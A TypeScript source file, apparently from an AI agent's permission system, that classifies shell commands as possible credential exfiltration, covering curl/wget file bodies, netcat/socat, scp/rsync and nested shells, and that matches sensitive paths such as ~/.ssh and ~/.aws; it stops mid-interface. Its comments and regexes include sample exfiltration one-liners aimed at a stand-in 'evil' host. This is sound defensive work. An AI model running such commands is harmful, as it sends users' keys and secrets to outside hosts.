// A sender carrying file/secret data, or a sensitive path combined with network/hidden code, forces per-call consent across the whole compound command, wrappers and child scripts. Inspect bodies, headers, redirects, substitutions and pipelines; rule allows never cover this floor.
// Plain downloads, literal form values, local copies and repository pushes are negative controls; the classifier grades matches HIGH and every permission mode asks once.
import { existsSync, readdirSync, realpathSync, statSync } from "node:fs";
import { homedir } from "node:os";
import { expandShellTildePaths } from "../../shared/home-tilde.js";
import { isAbsolute, join, posix, resolve, win32 } from "node:path";
import {
  staticShellWord,
  type ShellCommand,
  type ShellStatement,
  type ShellWord,
} from "../../shared/shell-analysis.js";
import { SHELL_ANALYSIS_LIMITS } from "../../shared/shell-parser.js";
import {
  SENSITIVE_PATH_ENTRIES,
  SENSITIVE_PATH_PATTERNS,
  MAX_WALK_UP,
  canonicalizePathForMatch,
  caseFoldForMatch,
  createSensitivePathMatcher,
  foldCanonicalPathSeparators,
  sensitiveLocationUnder,
} from "../sensitive-paths.js";
import {
  SHELL_PREFIX_POLICY,
  arithmeticEvaluationReason,
  asParsedShellCommand,
  parseShellCommand,
  shellFact,
  type ParsedShellCommand,
  type ShellCommandInput,
  codeCarryingVariable,
  hiddenCodeReason,
  isNetworkProgram,
  opaqueRunnerReason,
  wrapperCommand,
  runnerCommandIndexes,
} from "./shell-prefix-policy.js";

const PATH_READERS = new Set([
  "cat", "tac", "base64", "base32", "tar", "gzip", "bzip2", "xz", "zstd", "zip", "xxd", "od", "hexdump",
  "openssl", "gpg", "head", "tail", "dd", "less", "more", "strings", "cut", "sed", "awk", "jq",
]);
const SOCKET_SENDERS = new Set(["nc", "ncat", "netcat", "socat"]);
const SCRIPTED_TRANSFER = new Set(["sftp", "ftp", "lftp", "tftp"]);
const SHELLS = new Set(SHELL_PREFIX_POLICY.shells);
// Network-capable programs whose arguments routinely carry local file text that is not a request body (`git commit -m "$(cat msg)"`, `gh pr create --body "$(cat body.md)"`): only the sensitive-path rule applies to them.
export const MULTI_PURPOSE_NETWORK: ReadonlySet<string> = new Set(["git", "gh", "glab", "npm", "pnpm", "yarn", "docker", "podman", "kubectl", "gpg", "psql", "mysql", "openssl"]);
const CURL_BOOLEAN_SHORT = /^[sSfLkviIlnNqgGjJORZpaBM0-9]*$/;
const CURL_DATA_LONG = ["--data", "--data-binary", "--data-raw", "--data-urlencode", "--data-ascii", "--json"];
// `--form-string` sends its value literally (no `@` file read).
const CURL_FORM_LONG = ["--form"];
const CURL_HEADER_LONG = ["--header", "--proxy-header"];
const CURL_UPLOAD_LONG = ["--upload-file"];
const WGET_FILE_BODY = ["--post-file", "--body-file"];
const WGET_DATA_BODY = ["--post-data", "--body-data"];
const RECURSION_LIMIT = 4;

// Fallback for input the grammar cannot parse: file-sourced curl/wget bodies only.
const UNPARSED_FALLBACK = /\b(?:curl|wget)\b[^\n;&|]*\s(?:-[A-Za-z]*[dF]|--data(?:-binary|-raw|-urlencode|-ascii)?|--json|--form|-T|--upload-file|--post-file|--body-file)(?:=|\s+)?["']?[^\s"']*@/;
const UNPARSED_FILE_SOURCE = /\b(?:curl|wget)\b[^\n;&|]*\s(?:-[TK](?:\s+)?|--(?:upload-file|config|post-file|body-file)(?:=|\s+))["']?[^\s"']+/;

export const SHELL_EXFIL_VERDICT_REASON = "shell possible credential exfiltration";

function program(word: string | undefined): string | undefined {
  if (word === undefined) return undefined;
  return (word.split(/[\\/]/).pop() ?? word).replace(/\.exe$/i, "");
}

// `--flag` names one of `names`, exactly or as an unambiguous getopt-style abbreviation (wget accepts `--post-f`; at least 8 characters so `--data` style prefixes of unrelated options are not guessed).
function isLongOption(flag: string, names: readonly string[]): boolean {
  return names.some((name) => name === flag || (flag.length >= 8 && name.startsWith(flag)));
}

// Static text of a word. `~`, `$HOME` and `${HOME}` expand anywhere in the word (`@$HOME/.aws/credentials`, `@"$HOME/.ssh/id_rsa"`).
function wordText(word: ShellWord): string | undefined {
  let text = "";
  for (const part of word.parts) {
    if (part.kind === "literal" || part.kind === "pattern") text += part.value;
    else if (part.kind === "parameter" && part.name === "HOME" && part.index === undefined) text += homedir();
    else return undefined;
  }
  return text;
}

function substitutionBodies(word: ShellWord): ShellStatement[] {
  const bodies: ShellStatement[] = [];
  for (const part of word.parts) {
    if (part.kind === "substitution") bodies.push(part.body);
    else if (part.kind === "parameter-choice") bodies.push(...substitutionBodies(part.operand));
  }
  return bodies;
}

function commandsIn(statement: ShellStatement): ShellCommand[] {
  switch (statement.kind) {
    case "command": return [statement];
    case "sequence": case "pipeline": return statement.statements.flatMap(commandsIn);
    case "and": case "or": return [...commandsIn(statement.left), ...commandsIn(statement.right)];
    case "subshell": case "background": case "negate": case "redirected": case "function":
      return commandsIn(statement.body);
    case "for": case "while": return commandsIn(statement.body);
    case "if": return [...commandsIn(statement.condition), ...commandsIn(statement.consequent), ...commandsIn(statement.alternate)];
    default: return [];
  }
}

interface Context {
  cwd: string | undefined;
  depth: number;
  // Variables assigned from a file read earlier in the same command line.
  tainted: Set<string>;
  scan: ScanState;
}

// Sink-only command views through transparent wrappers and opaque runners. A runner view is a conservative candidate, never an allow-rule boundary.
function* commandCandidates(words: readonly ShellWord[]): Generator<{ words: readonly ShellWord[]; name: string }> {
  const argv = words.map(wordText);
  const seen = new Set<string>();
  const wrapper = wrapperCommand(argv);
  for (const index of new Set([wrapper.index, ...(wrapper.candidates ?? []), ...runnerCommandIndexes(argv)])) {
    const name = program(argv[index]);
    if (!name || seen.has(name)) continue;
    seen.add(name);
    // The earliest occurrence sees every later argument for this sender. Literal code arguments are inspected separately from command views.
    if (PATH_READERS.has(name) || SHELLS.has(name) || name === "eval" || isNetworkProgram([name])) yield { words: words.slice(index), name };
  }
}

// A command that reads a named path (a pipeline feeder or substitution body). A zero-word `$(<.env)` is bash's file-read shorthand.
function readsPath(cmd: ShellCommand): boolean {
  if (cmd.words.length === 0) {
    return cmd.redirects.some((redirect) => redirect.effect === "read" && redirect.target !== undefined);
  }
  for (const { words, name } of commandCandidates(cmd.words)) {
    if (!PATH_READERS.has(name)) continue;
    if (cmd.redirects.some((redirect) => redirect.effect === "read" && redirect.target)) return true;
    if (words.slice(1).some((word) => {
      const text = wordText(word);
      return text === undefined || !text.startsWith("-");
    })) return true;
  }
  return false;
}

function usesTainted(word: ShellWord, ctx: Context): boolean {
  return word.parts.some((part) =>
    (part.kind === "parameter" && ctx.tainted.has(part.name))
    || (part.kind === "parameter-choice" && (ctx.tainted.has(part.name) || usesTainted(part.operand, ctx))));
}

// True when any word carries file data: a path-reading `$(…)` or a tainted variable.
function bodiesReadPath(words: readonly ShellWord[], ctx: Context): boolean {
  if (words.some((word) => usesTainted(word, ctx))) return true;
  return words.flatMap(substitutionBodies).flatMap(commandsIn).some(readsPath);
}

// Variables assigned from a file read anywhere in the command line (`X=$(cat.env); curl -d "$X" …`, `read X <.env`), to a fixed point so a copy (`Y=$X`) is tainted too.
function collectTainted(root: ShellStatement, ctx: Context): void {
  const all = commandsIn(root);
  const nested = (statement: ShellStatement): ShellCommand[] => commandsIn(statement).flatMap((cmd) => [
    cmd,
    ...[...cmd.words, ...cmd.assignments.map((assignment) => assignment.value)].flatMap(substitutionBodies).flatMap(nested),
  ]);
  const commands = all.flatMap((cmd) => nested(cmd));
  for (let changed = true, guard = 0; changed && guard < 8; guard += 1) {
    changed = false;
    for (const cmd of commands) {
      for (const assignment of cmd.assignments) {
        if (!ctx.tainted.has(assignment.name) && bodiesReadPath([assignment.value, ...(assignment.elements ?? [])], ctx)) {
          ctx.tainted.add(assignment.name);
          changed = true;
        }
      }
      const head = cmd.words[0] ? program(wordText(cmd.words[0])) : undefined;
      if (head === "read" || head === "mapfile" || head === "readarray") {
        const fromFile = cmd.redirects.some((redirect) => redirect.effect === "read" && (redirect.target !== undefined || (redirect.data !== undefined && bodiesReadPath([redirect.data], ctx))));
        if (fromFile) {
          for (const word of cmd.words.slice(1)) {
            const name = wordText(word);
            if (name && /^[A-Za-z_][A-Za-z0-9_]*$/.test(name) && !ctx.tainted.has(name)) {
              ctx.tainted.add(name);
              changed = true;
            }
          }
        }
      }
    }
  }
}

function isRemoteTarget(text: string | undefined): boolean {
  if (text === undefined) return false;
  if (/^(?:rsync|scp|sftp):\/\//i.test(text)) return true;
  if (text.startsWith("/") || text.startsWith(".") || /^[A-Za-z]:[\\/]/.test(text)) return false;
  return /^(?:[^\s/@:]+@)?[A-Za-z0-9._-]+:/.test(text) && !/^[a-z][a-z0-9+.-]*:\/\//i.test(text);
}

function curlSignal(args: readonly ShellWord[], ctx: Context): string | null {
  for (let index = 0; index < args.length; index += 1) {
    const word = args[index]!;
    const raw = wordText(word) ?? word.source.raw;
    let flag: string | undefined;
    let valueText: string | undefined;
    let valueWord: ShellWord | undefined;
    const long = /^(--[a-z-]+)(?:=([\s\S]*))?$/.exec(raw);
    if (long) {
      flag = long[1];
      if (long[2] !== undefined) { valueText = long[2]; valueWord = word; }
      else if (args[index + 1]) { valueWord = args[index + 1]; valueText = wordText(valueWord); }
    } else if (/^-[A-Za-z]/.test(raw)) {
      const letters = raw.slice(1);
      const at = letters.search(/[dFTHK]/);
      // Only boolean flags may precede it in a cluster; after a value-taking flag (`-XPOST`, `-ofile`) the rest of the word is that flag's value.
      if (at === -1 || !CURL_BOOLEAN_SHORT.test(letters.slice(0, at))) continue;
      flag = `-${letters[at]}`;
      if (at === letters.length - 1) {
        valueWord = args[index + 1];
        valueText = valueWord ? wordText(valueWord) : undefined;
      } else {
        valueText = letters.slice(at + 1);
        valueWord = word;
      }
    }
    if (!flag) continue;
    const dataFlag = flag === "-d" || isLongOption(flag, CURL_DATA_LONG);
    const formFlag = flag === "-F" || isLongOption(flag, CURL_FORM_LONG);
    const headerFlag = flag === "-H" || isLongOption(flag, CURL_HEADER_LONG);
    const uploadFlag = flag === "-T" || isLongOption(flag, CURL_UPLOAD_LONG);
    if (uploadFlag && (valueWord || valueText)) return "curl upload of a file";
    // A config file can carry `data = @file`, `upload-file`, URLs and headers.
    if ((flag === "-K" || flag === "--config") && (valueWord || valueText)) return "curl config file";
    const fromSubstitution = valueWord !== undefined && bodiesReadPath([valueWord], ctx);
    // `--data-urlencode name@file` also reads a file.
    const urlencodeFile = flag.startsWith("--data-urlenc") && /^[^=@]*@/.test(valueText ?? "");
    if (dataFlag && (valueText?.startsWith("@") || urlencodeFile || fromSubstitution)) return "curl body from a file";
    if (formFlag && (/=[@<]/.test(valueText ?? "") || fromSubstitution)) return "curl form field from a file";
    if (headerFlag && valueText?.startsWith("@")) return "curl header from a file";
  }
  return null;
}

function wgetSignal(args: readonly ShellWord[], ctx: Context): string | null {
  for (let index = 0; index < args.length; index += 1) {
    const word = args[index]!;
    const raw = wordText(word) ?? word.source.raw;
    if (/^-e\s*(?:post|body)_?file\s*=|^--execute=(?:post|body)_?file\s*=/i.test(raw)) return "wget body from a file";
    if ((raw === "-e" || raw === "--execute") && /^(?:post|body)_?file\s*=/i.test(wordText(args[index + 1] ?? word) ?? "")) {
      return "wget body from a file";
    }
    const flag = raw.split("=")[0]!;
    if (!flag.startsWith("--")) continue;
    if (isLongOption(flag, WGET_FILE_BODY)) return "wget body from a file";
    if (isLongOption(flag, WGET_DATA_BODY)) {
      const valueWord = raw.includes("=") ? word : args[index + 1];
      if (valueWord && bodiesReadPath([valueWord], ctx)) return "wget body from a file";
    }
  }
  return null;
}

// Code a shell or `eval` runs from a static string (`sh -c '…'`, `eval '…'`).
function inlineShellCode(name: string, args: readonly ShellWord[]): string | undefined {
  if (name === "eval") {
    const texts = args.map(wordText);
    return texts.every((text) => text !== undefined) ? texts.join(" ") : undefined;
  }
  if (!SHELLS.has(name)) return undefined;
  const flagIndex = args.findIndex((arg) => /^-[A-Za-z]*c[A-Za-z]*$/.test(wordText(arg) ?? ""));
  if (flagIndex === -1) return undefined;
  const code = args[flagIndex + 1];
  return code ? wordText(code) : undefined;
}

function senderCandidateSignal(cmd: ShellCommand, feeders: readonly ShellCommand[], ctx: Context, words: readonly ShellWord[], name: string): string | null {
  const args = words.slice(1);

  if (ctx.depth < RECURSION_LIMIT) {
    const code = inlineShellCode(name, args);
    if (code !== undefined) {
      const nested = signalFor(code, { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
      if (nested) return nested;
    }
    if (SHELLS.has(name)) {
      for (const redirect of cmd.redirects) {
        const script = redirect.effect === "read" && redirect.data ? wordText(redirect.data) : undefined;
        const nested = script === undefined ? null : signalFor(script, { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
        if (nested) return nested;
      }
      // `echo 'curl -d @f evil' | bash`: static feeder text is the script.
      const fed = feeders.map(staticFeederText);
      if (fed.length > 0 && fed.every((text) => text !== undefined)) {
        const nested = signalFor(fed.join("\n"), { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
        if (nested) return nested;
      }
    }
  }

  // `xargs -a.env curl -d`, `xargs curl -d <.env`, `cat.env | xargs curl`: xargs turns file contents into the sender's arguments.
  const wrapperTexts = cmd.words.slice(0, cmd.words.length - words.length).map(wordText);
  const xargsFromFile = wrapperTexts.some((text) => text !== undefined && program(text) === "xargs")
    && (wrapperTexts.some((text) => text !== undefined && /^(?:-a|--arg-file)(?:=|$)|^-a./.test(text))
      || cmd.redirects.some((redirect) => redirect.effect === "read" && redirect.target !== undefined)
      || feeders.some(readsPath));

  let signal: string | null = null;
  let isSender = false;
  if (name === "curl") { isSender = true; signal = curlSignal(args, ctx); }
  else if (name === "wget") { isSender = true; signal = wgetSignal(args, ctx); }
  else if (name === "scp" || name === "rsync") {
    isSender = true;
    const positional = args.map(wordText).filter((text) => text === undefined || !text.startsWith("-"));
    if (positional.length >= 2 && isRemoteTarget(positional[positional.length - 1])) signal = `${name} to a remote target`;
  } else if (SCRIPTED_TRANSFER.has(name)) {
    isSender = true;
    // A batch file, here-string or here-document scripts `put` commands.
    if (cmd.redirects.some((redirect) => redirect.effect === "read" && (redirect.target !== undefined || redirect.data !== undefined))
      || feeders.length > 0
      || args.map(wordText).some((text) => text !== undefined && /^-b/.test(text))) {
      signal = `${name} scripted transfer`;
    } else if (name === "sftp" && args.map(wordText).some((text) => text !== undefined && !text.startsWith("-") && (isRemoteTarget(text) || /^[^\s/@:]+@[A-Za-z0-9._-]+$/.test(text)))) {
      signal = "sftp to a remote target";
    }
  } else if (SOCKET_SENDERS.has(name)) {
    isSender = true;
    if (cmd.redirects.some((redirect) => redirect.effect === "read" && (redirect.target || (redirect.data && bodiesReadPath([redirect.data], ctx))))) {
      signal = `${name} fed from a file`;
    } else if (feeders.some(readsPath)) {
      signal = `${name} fed from a file`;
    } else if (name === "socat" && args.map(wordText).some((text) => text !== undefined && /^(?:FILE|OPEN|GOPEN|EXEC|SYSTEM):/i.test(text))) {
      signal = "socat file or command address";
    }
  } else if (isNetworkProgram([name]) && !MULTI_PURPOSE_NETWORK.has(name)) {
    // `nslookup $(cat key|base64).evil.com`, `ssh evil "$(cat key)"`.
    isSender = true;
  }
  if (!isSender) return null;
  ctx.scan.sender = true;
  if (signal) return signal;
  if (xargsFromFile) return `xargs feeds a file into ${name}`;
  // Any argument (the URL or host included) built from a substitution that reads a path, or from a variable assigned from one, carries file data out.
  if (bodiesReadPath(args, ctx)) return `${name} argument built from a file`;
  // Reader-independent inspection owns sensitive paths, including feeders.
  return null;
}

function senderSignal(cmd: ShellCommand, feeders: readonly ShellCommand[], ctx: Context): string | null {
  for (const { words, name } of commandCandidates(cmd.words)) {
    const signal = senderCandidateSignal(cmd, feeders, ctx, words, name);
    if (signal) return signal;
  }
  const argv = cmd.words.map(wordText);
  const wrapper = wrapperCommand(argv);
  const code = wrapper.code?.text;
  if (code !== undefined && ctx.depth < RECURSION_LIMIT) {
    const nested = signalFor(code, { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
    if (nested) return nested;
  }
  if ((wrapper.candidates || opaqueRunnerReason(argv)) && ctx.depth < RECURSION_LIMIT) {
    // Literal code arguments retain structural sink inspection without interpreting which runner option, if any, binds the argument.
    for (const word of cmd.words.slice(wrapper.candidates?.[0] ?? wrapper.index + 1)) {
      const text = wordText(word);
      if (text === undefined || !/[\s;&|<>]/.test(text)) continue;
      const code = text.startsWith("-") && text.includes("=") ? text.slice(text.indexOf("=") + 1) : text;
      const nested = signalFor(code, { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
      if (nested) return nested;
    }
  }
  return null;
}

function walk(statement: ShellStatement, ctx: Context): string | null {
  switch (statement.kind) {
    case "command": {
      const own = statement.words.length > 0 ? senderSignal(statement, [], ctx) : null;
      if (own) return own;
      const words = [
        ...statement.words,
        ...statement.assignments.flatMap((assignment) => [assignment.value, ...(assignment.elements ?? [])]),
        ...statement.redirects.flatMap((redirect) => [redirect.target, redirect.data].filter((word): word is ShellWord => word !== undefined)),
      ];
      for (const body of words.flatMap(substitutionBodies)) {
        const nested = walk(body, ctx);
        if (nested) return nested;
      }
      return null;
    }
    case "pipeline": {
      const stages = statement.statements;
      for (let index = 0; index < stages.length; index += 1) {
        const stage = stages[index]!;
        if (stage.kind === "command" && stage.words.length > 0) {
          const feeders = stages.slice(0, index).flatMap(commandsIn);
          const signal = senderSignal(stage, feeders, ctx);
          if (signal) return signal;
        }
        const nested = walk(stage, ctx);
        if (nested) return nested;
      }
      return null;
    }
    case "sequence":
      for (const child of statement.statements) {
        const nested = walk(child, ctx);
        if (nested) return nested;
      }
      return null;
    case "and": case "or":
      return walk(statement.left, ctx) ?? walk(statement.right, ctx);
    case "subshell": case "background": case "negate": case "redirected": case "function":
      return walk(statement.body, ctx);
    case "for": case "while":
      return walk(statement.body, ctx) ?? (statement.kind === "while" ? walk(statement.condition, ctx) : null);
    case "if":
      return walk(statement.condition, ctx) ?? walk(statement.consequent, ctx) ?? walk(statement.alternate, ctx);
    default:
      return null;
  }
}

// Reader-independent sensitive-path scan A sensitive path anywhere in the command line — any word, assignment, redirection, `$`/backtick/process-substitution body, loop list, or the static text of hidden code — is found here no matter which program reads it. `~`, `~user`, `$HOME`, `${HOME}` normalize to a home directory; other expansions (`$(echo ~)`, `$X`) become an opaque segment so a literal tail (`$(echo ~)/.aws/credentials`) still matches the anchor-free sensitive patterns; brace expansion is expanded and a glob is instantiated against the sensitive names it could reach.

// Opaque stand-in for a runtime expansion inside a path.
const DYNAMIC_SEGMENT = "__ave_dynamic__";
const GLOB_INSTANCE_LIMIT = 256;
const BRACE_EXPANSION_LIMIT = 64;
// Network transports that are paths, not programs (`> /dev/tcp/host/port`).
const NETWORK_DEVICE = /\/dev\/(?:tcp|udp)\//;
// Fallback for unparseable input: a network program name as a word.
const NETWORK_WORD = /(?:^|[\s;&|(`$])(?:curl|wget|ssh|scp|sftp|rsync|openssl|nc|ncat|netcat|socat|telnet|nslookup|dig|host|gh|aws|gcloud|az|http|https|ftp)(?=\s|$)/;
const NON_FILE_URL = /^(?!file:)[a-z][a-z0-9+.-]*:\/\//i;

let sensitiveNameCache: readonly string[] | undefined;
// Every literal path segment of the sensitive-path table (`.ssh`, `.aws`, `id_rsa`, `.env`, …).
function sensitiveNames(): readonly string[] {
  sensitiveNameCache ??= [...new Set([
    ...SENSITIVE_PATH_ENTRIES.flatMap((entry) => entry.segments),
    ...SENSITIVE_PATH_PATTERNS.flatMap((pattern) => pattern.split("/"))
      .filter((segment) => segment.length > 0 && segment !== "**" && segment !== "*")
      .map((segment) => segment.replace(/\*/g, "x")),
  ])];
  return sensitiveNameCache;
}

// Glob text marks a literal `*`/`?`/`[` with a private-use escape (never a backslash, which is a separator on Windows).
const GLOB_ESCAPE = "\uE000";

function escapeGlob(text: string): string {
  return text.replace(/[*?[\uE000]/g, `${GLOB_ESCAPE}$&`);
}

function unescapeGlob(text: string): string {
  return text.replace(/\uE000(.)/gu, "$1");
}

function hasWildcard(segment: string): boolean {
  return segment.replace(/\uE000./gu, "").search(/[*?[]/) !== -1;
}

function segmentRegex(segment: string): RegExp {
  let source = "";
  for (let index = 0; index < segment.length; index += 1) {
    const char = segment[index]!;
    if (char === GLOB_ESCAPE && index + 1 < segment.length) {
      source += segment[index + 1]!.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      index += 1;
    } else if (char === "*") source += ".*";
    else if (char === "?") source += ".";
    else if (char === "[") {
      const close = segment.indexOf("]", index + 2);
      if (close === -1) { source += "\\["; continue; }
      source += `[${segment.slice(index + 1, close).replace(/^!/, "^").replace(/[\\\]]/g, "\\$&")}]`;
      index = close;
    } else source += char.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  }
  try {
    return new RegExp(`^${source}$`);
  } catch {
    return /^.*$/;
  }
}

// The sensitive-table pattern a (possibly glob) path can reach, or null. Wildcard segments are instantiated with every sensitive name they match that exists in that directory (dot names only when the segment starts with `.`, as bash does without `dotglob`) plus one ordinary filler.
type ScanWork = (steps: number, chars?: number) => void;

// Generic path/glob work per decision; lexical visible-path checks continue after exhaustion.
const SHELL_PATH_SCAN_LIMITS = Object.freeze({ steps: 16_384, chars: 65_536 });
class ShellScanBudgetError extends Error {}

// Match the shell namespace and the native identity through the same projection in every scan lane.
// Fold separators before resolving parents; drive/share/device roots only locate the namespace.
function matchShellPath(path: string, match: (path: string) => string | null, canonical: boolean): string | null {
  const slashed = foldCanonicalPathSeparators(path);
  let shellPath = slashed;
  if (process.platform === "win32") {
    shellPath = shellPath.replace(/^\/+[?.]\//, "");
    if (/^UNC\//i.test(shellPath)) shellPath = `//${shellPath.slice(4)}`;
    const root = win32.parse(shellPath).root;
    if (root) shellPath = `/${shellPath.slice(root.length)}`;
  }
  const shellHit = match(caseFoldForMatch(posix.normalize(shellPath)));
  return shellHit ?? match(caseFoldForMatch(canonical
    ? canonicalizePathForMatch(slashed) : posix.normalize(slashed)));
}

function sensitivePathHit(glob: string, cwd: string | undefined, dotglob: boolean, match: (path: string) => string | null, spend?: ScanWork, canonical = true): string | null {
  spend?.(1, glob.length);
  if (!glob || glob === "-") return null;
  const matchPath = (path: string): string | null => matchShellPath(path, match, canonical);
  const absolute = isAbsolute(glob) ? glob : resolve(cwd ?? "/", glob);
  const segments = absolute.split(/[\\/]/);
  // Whatever a wildcard expands to stays below its literal directory prefix:
  // `~/.mozilla/firefox/*/log*ns.json` reads inside `~/.mozilla` however the
  // random profile name or the file name is spelled.
  const firstWild = segments.findIndex(hasWildcard);
  if (firstWild > 0) {
    const prefix = unescapeGlob(segments.slice(0, firstWild).join("/")) || "/";
    spend?.(canonical ? MAX_WALK_UP + 1 : 1, prefix.length);
    const hit = matchPath(prefix);
    if (hit) return hit;
  }
  let instances: string[][] = [[]];
  for (const segment of segments) {
    spend?.(1, segment.length);
    const next: string[][] = [];
    const add = (parts: string[]): void => { next.push(parts); };
    for (const prefix of instances) {
      spend?.(1);
      if (!hasWildcard(segment)) { add([...prefix, unescapeGlob(segment)]); continue; }
      if (segment === "**") add(prefix);
      // The shell expands a glob against the directory as it is: a sensitive name is reachable when it exists there (or when `**` may go deeper).
      const pattern = segment === "**" ? /^/ : segmentRegex(segment);
      const dotAllowed = dotglob || segment.startsWith(".");
      const wildcards = (segment.match(/\*/g) ?? []).length;
      for (const name of sensitiveNames()) {
        // Reserve backtracking combinations before entering a pattern matcher.
        spend?.((name.length + 1) ** wildcards, segment.length + name.length);
        if (!pattern.test(name) || (!dotAllowed && name.startsWith("."))) continue;
        if (!canonical || existsSync([...prefix, name].join("/") || "/")) add([...prefix, name]);
      }
      // One ordinary match stands for "any entry": it reaches a sensitive
      // directory's contents (`~/.ssh/*`) and a name-only pattern (`*/id_rsa`).
      if (segment !== "**") add([...prefix, unescapeGlob(segment.replace(/\[[^\]]*\]/g, "a").replace(/[*?]/g, "a"))]);
      if (next.length > GLOB_INSTANCE_LIMIT) {
        spend?.(SHELL_PATH_SCAN_LIMITS.steps + 1);
        throw new ShellScanBudgetError("Analysis budget exceeded");
      }
    }
    instances = next;
  }
  for (const parts of instances) {
    // Canonicalization has a bounded ancestor walk; reserve its maximum work.
    spend?.(canonical ? MAX_WALK_UP + 1 : 1, parts.reduce((length, part) => length + part.length + 1, 0));
    const path = parts.join("/") || "/";
    const hit = matchPath(path);
    if (hit) return hit;
  }
  return null;
}

function isNonFileUrlArgument(text: string): boolean {
  const equals = text.indexOf("=");
  // URL user-info and query values are not separate local file bindings.
  return NON_FILE_URL.test(text.replace(/^-[A-Za-z]/, ""))
    || (equals >= 0 && NON_FILE_URL.test(text.slice(equals + 1)));
}

// Paths an argument can name, including attached values and a source before a destination separator.
function argumentCandidates(glob: string): string[] {
  if (isNonFileUrlArgument(glob)) return [];
  const equals = glob.indexOf("=");
  const attachedPath = /^-[A-Za-z](?=[~./\\]|[A-Za-z]:[\\/])/.test(glob) ? glob.slice(2) : undefined;
  if (glob.startsWith("-") && !glob.includes("=") && !glob.includes("@") && attachedPath === undefined) return [];
  const candidates = [glob];
  if (attachedPath !== undefined) candidates.push(attachedPath);
  if (equals >= 0) candidates.push(glob.slice(equals + 1));
  const at = glob.indexOf("@");
  if (at >= 0) candidates.push(glob.slice(at + 1));
  return candidates
    .map((text) => text.replace(/^(?:<|(?:FILE|OPEN|GOPEN):)/i, "").replace(/^file:\/\//i, ""))
    .filter((text) => text.length > 0 && text !== "-" && !/^[a-z][a-z0-9+.-]*:\/\//i.test(text))
    .flatMap((text) => {
      // A drive prefix belongs to the source; its next colon binds a destination. Protocol-only prefixes never prove a source path.
      const separator = text.indexOf(":", /^[a-z]:[\\/]/i.test(text) ? 2 : 0);
      const source = separator > 0 ? text.slice(0, separator) : "";
      return !text.startsWith("-") && separator < text.length - 1 && /[\\/]|^[.~]/.test(source)
        ? [text, source] : [text];
    });
}

// Bash brace expansion (`~/.{ssh,aws}/x`); a range (`{1..9}`) becomes a wildcard.
function expandBraces(text: string, spend?: ScanWork): string[] {
  spend?.(1, text.length);
  for (let open = 0; open < text.length; open += 1) {
    spend?.(1);
    if (text[open] === "\\") { open += 1; continue; }
    if (text[open] !== "{") continue;
    let depth = 0;
    let close = open;
    const commas: number[] = [];
    for (; close < text.length; close += 1) {
      spend?.(1);
      const char = text[close];
      if (char === "\\") { close += 1; continue; }
      if (char === "{") depth += 1;
      else if (char === "}") { depth -= 1; if (depth === 0) break; }
      else if (char === "," && depth === 1) commas.push(close);
    }
    if (close >= text.length) return [text];
    const head = text.slice(0, open);
    const tail = text.slice(close + 1);
    if (commas.length === 0) {
      if (text.slice(open + 1, close).includes("..")) return expandBraces(`${head}*${tail}`, spend);
      continue;
    }
    const bounds = [open, ...commas, close];
    const out: string[] = [];
    for (let index = 0; index + 1 < bounds.length; index += 1) {
      for (const expanded of expandBraces(head + text.slice(bounds[index]! + 1, bounds[index + 1]) + tail, spend)) {
        spend?.(1);
        if (out.length >= BRACE_EXPANSION_LIMIT) return out;
        out.push(expanded);
      }
    }
    return out;
  }
  return [text];
}

// Glob texts for shell text the AST did not lower (`~user/…`, `{a,b}`) or for a code token.
function rawGlobs(raw: string, home: () => string, spend?: ScanWork): string[] {
  spend?.(1, raw.length);
  return expandBraces(rawGlobText(raw, home), spend);
}

function rawGlobText(raw: string, home: () => string): string {
  return raw
    .replace(/["']/g, "")
    .replace(/^~([A-Za-z0-9._-]*)(?=\/|$)/, (_match, user: string) => (user ? `/home/${user}` : escapeGlob(home())))
    .replace(/\$\{HOME\}|\$HOME\b/g, () => escapeGlob(home()))
    .replace(/\$\([^)]*\)|`[^`]*`|\$\{[^}]*\}|\$[A-Za-z_][A-Za-z0-9_]*/g, DYNAMIC_SEGMENT);
}

// Glob text of a word from the AST, or null when part of it was not lowered.
function wordGlob(word: ShellWord, home: () => string): string | null {
  let text = "";
  for (const part of word.parts) {
    switch (part.kind) {
      case "literal": case "unicode-escaped": text += escapeGlob(part.value); break;
      case "pattern": text += part.value; break;
      case "parameter":
        text += part.name === "HOME" && part.index === undefined ? escapeGlob(home()) : DYNAMIC_SEGMENT;
        break;
      case "parameter-choice": case "substitution": case "arithmetic-data": text += DYNAMIC_SEGMENT; break;
      case "unknown": return null;
    }
  }
  return text;
}

interface ScanState {
  // Every working directory a later command may run in. A `cd`/`pushd` adds its target and never removes one: a failed `cd`, a subshell or a pipeline stage leaves an earlier directory in force, so each one stays a candidate.
  cwds: (string | undefined)[];
  // A directory change whose target is not static: a relative root is unknown.
  cwdUnknown: boolean;
  // Bumped whenever cwds grows, so loops and functions are rescanned.
  cwdVersion: number;
  // A `cd`/`pushd` already ran earlier in the command (OLDPWD and the stack are in cwds).
  dirChanged: boolean;
  // The command reassigns HOME, so `cd` / `cd ~` names an unknown directory.
  homeReassigned: boolean;
  // CDPATH, `cdable_vars` or `autocd` can redirect a relative `cd`.
  cdRedirects: boolean;
  // Ask reason from directory tracking; unlike ordinaryAsk it keeps path checks canonical.
  cdAsk?: string;
  // The directories the shell is in if the statement just scanned succeeded, when that statement was a static directory change. The right side of `&&` runs only after that success, so it sees these instead of every candidate.
  cdSuccess?: (string | undefined)[];
  // The command is a pipeline stage whose output an `xargs` stage turns into arguments.
  feedsXargs: boolean;
  // For an `xargs` pipeline stage, the stages before it, whose output becomes its arguments.
  xargsUpstream?: readonly ShellStatement[];
  // The command only lists names and metadata (`ls`, `du`, `stat`), so a glob whose expansion reaches a protected directory reads no store content.
  metadataListing: boolean;
  // Ask reason for a read the scan cannot bound but the OS floor confines: a metadata listing glob that expands into a protected directory, or a recursive reader fed static, ordinary roots through `xargs`. Like cdAsk it keeps path checks canonical.
  confinedAsk?: string;
  functions: { body: ShellStatement; version: number }[];
  dotglob: boolean;
  sensitive: string | null;
  network: boolean;
  hidden: boolean;
  sender?: boolean;
  ordinaryAsk?: string;
  match: (path: string) => string | null;
  pathResults: Map<string, string | null>;
  fallbackSteps: number;
